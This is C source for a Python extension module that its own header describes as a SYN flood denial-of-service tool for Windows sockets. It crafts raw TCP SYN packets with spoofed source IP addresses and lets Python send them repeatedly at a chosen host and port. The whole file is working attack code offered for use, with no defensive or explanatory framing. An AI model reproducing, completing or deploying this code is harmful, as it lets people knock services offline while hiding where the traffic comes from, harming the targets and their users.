/*
    Syn Flood DOS with WINDOWS sockets, thanks binarytides.com!
*/

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h> //HDRINCL
#include <conio.h>
#include <Python.h>

typedef struct ip
{
    unsigned char  ip_hl :4;          // 4-bit header length (in 32-bit words) normally=5 (Means 20 Bytes may be 24 also)
    unsigned char  ip_v  :4;          // 4-bit IPv4 version
    unsigned char  ip_tos;           // IP type of service
    unsigned short ip_len;           // Total length
    unsigned short ip_id;            // Unique identifier 
    
	unsigned char  ip_off:5;      // Fragment offset field
	
	unsigned char  ip_more_fragment :1; //Don't know where these four are for.
	unsigned char  ip_dont_fragment :1;
	unsigned char  ip_reserved_zero :1;
    unsigned char  ip_frag_offset1;  //fragment offset
	
	unsigned char  ip_ttl;           // Time to live
    unsigned char  ip_p;             // Protocol(TCP,UDP etc)
    unsigned short ip_sum;           // IP checksum
    unsigned int   ip_src;           // Source address
    unsigned int   ip_dst;           // Source address
}   IPV4_HDR, *PIPV4_HDR, FAR * LPIPV4_HDR;


// TCP header
typedef struct tcphdr
{ 
	unsigned short th_sport;  // source port 
	unsigned short th_dport;    // destination port 
	unsigned int   th_seq;     // sequence number - 32 bits 
	unsigned int   th_ack;  // acknowledgement number - 32 bits 
		
	unsigned char  ns   :1;          //Nonce Sum Flag Added in RFC 3540.
	unsigned char  reserved_part1:3; //according to rfc
	unsigned char  th_off:4;    /*The number of 32-bit words in the TCP header. 
									   This indicates where the data begins. 
									   The length of the TCP header is always a multiple 
									   of 32 bits.*/
    		
	//unsigned char th_flags;
	unsigned char  fin  :1;      //Finish Flag
	unsigned char  syn  :1;      //Synchronise Flag
	unsigned char  rst  :1;      //Reset Flag
	unsigned char  psh  :1;      //Push Flag 
	unsigned char  ack  :1;      //Acknowledgement Flag 
	unsigned char  urg  :1;      //Urgent Flag
    
	unsigned char  ecn  :1;      //ECN-Echo Flag
    unsigned char  cwr  :1;      //Congestion Window Reduced Flag
	
	////////////////////////////////
	
	unsigned short th_win;  // window 
	unsigned short th_sum;  // checksum 
	unsigned short th_urp;  // urgent pointer 
}   TCP_HDR , *PTCP_HDR , FAR * LPTCP_HDR , TCPHeader , TCP_HEADER;

#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECN 0x40
#define TH_CWR 0x80

typedef struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    //char tcp[28];
    struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum=0;

    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }

    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
	
    return(answer);
}

//Datagram to represent the packet
char datagram[4096] __attribute__((section ("seg_name"), shared));
//IP header
struct ip *iph __attribute__((section ("seg_name"), shared)) = (struct ip *)datagram;
//TCP header
struct tcphdr *tcph __attribute__((section ("seg_name"), shared)) = (struct tcphdr *) (datagram + sizeof(struct ip));
struct sockaddr_in sin2 __attribute__((section ("seg_name"), shared));
struct pseudo_header psh __attribute__((section ("seg_name"), shared));

static PyObject * synmod_send(PyObject *self, PyObject* args)
{
    int s, ok;
	
    ok = PyArg_ParseTuple(args, "i", &s);

    if(!ok)
    {
        printf("Python parsing failed\r\n");
        return PyInt_FromLong(-1L);
    }

    //printf("Various data: %i %i\r\n", s, iph->ip_len);
    if (sendto(s,      /* our socket */
               datagram,   /* the buffer containing headers and data */
               sizeof(struct ip) + sizeof(struct tcphdr),    /* total length of our datagram */
               0,      /* routing flags, normally always 0 */
               (struct sockaddr *)&sin2,   /* socket addr, just like in */
               sizeof(sin2)) < 0)       /* a normal send() */
    {
        printf("error %s\r\n", WSAGetLastError());
        return PyInt_FromLong(-1L);
    }
    return PyInt_FromLong(42L);
}

static PyObject * synmod_createSocket(PyObject *self, PyObject* args)
{
    int s = 0;
    
    //Create a raw socket
    if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        printf("socket creation failed %s\r\n", WSAGetLastError());
        return PyInt_FromLong(-1L);
    }
    
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)val, sizeof(one)) < 0)
        {
            printf("Failed to set HDRINCL: %s\r\n", WSAGetLastError());
            return PyInt_FromLong(-1L);
        }
    }

    return PyInt_FromLong(s);
}

static PyObject * synmod_init(PyObject *self, PyObject* args)
{
    int src_port, dest_port, ok;
    const char *src_addr, *dest_addr;
    struct hostent *server;
	
    ok = PyArg_ParseTuple(args, "sisi", &src_addr, &src_port, &dest_addr, &dest_port);

    if(!ok)
    {
        printf("Python parsing failed\r\n");
        return PyInt_FromLong(-1L);
    }

    /* printf("Using src %s:%i dest %s:%i\r\n", src_addr, src_port, dest_addr, dest_port); */
	
    WSADATA wsock;
    printf("Initialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsock) != 0)
    {
        printf("WSAStartup() failed\r\n");
        return PyInt_FromLong(-1L);
    } 

    printf("Initialised successfully.\r\n");
    
    if((server = gethostbyname(dest_addr)) == 0)
	{
		printf("Unable to resolve\r\n");
		return PyInt_FromLong(-1L);
	}
 
    sin2.sin_family = AF_INET; //dest addr
    sin2.sin_port = htons(dest_port);
    memcpy(&sin2.sin_addr.s_addr, server->h_addr, server->h_length);
 
    memset(datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
    iph->ip_id = htons(rand()); //Id of this packet
    iph->ip_off = 0;
	iph->ip_frag_offset1 = 0;
	iph->ip_reserved_zero = 0;
	iph->ip_dont_fragment = 1;
	iph->ip_more_fragment = 0;
    iph->ip_ttl = rand()%256;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;      //Set to 0 before calculating checksum
    iph->ip_src = inet_addr(src_addr);  //Spoof the source ip address
    iph->ip_dst = inet_addr(dest_addr);
    iph->ip_sum = csum((unsigned short *)datagram, iph->ip_len >> 1);

    //TCP Header
    tcph->th_sport = htons(src_port);
    tcph->th_dport = htons(dest_port);
    tcph->th_seq = rand();
    tcph->th_ack = 0;
    tcph->th_off = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->th_win = htons(rand()%5000); /* maximum allowed window size */
    tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
                        should fill in the correct checksum during transmission */
    tcph->th_urp = 0;
    
    //Now the IP checksum
    psh.source_address = inet_addr(src_addr);
    psh.dest_address = sin2.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
   
    tcph->th_sum = csum((unsigned short*) &psh , sizeof(struct pseudo_header));
	
    return PyInt_FromLong(42L);
}

static PyMethodDef SYNModMethods[] = {
    {"init",  synmod_init, METH_VARARGS, ""},
    {"createSocket",  synmod_createSocket, METH_VARARGS, ""},
    {"send",  synmod_send, METH_VARARGS, ""},
    {NULL, NULL, 0, NULL}        /* Sentinel */
};

PyMODINIT_FUNC initsynmod(void)
{
    PyObject *m;
    PyImport_AddModule("synmod");
    m = Py_InitModule("synmod", SYNModMethods);
    if (m == NULL)
        return;
}
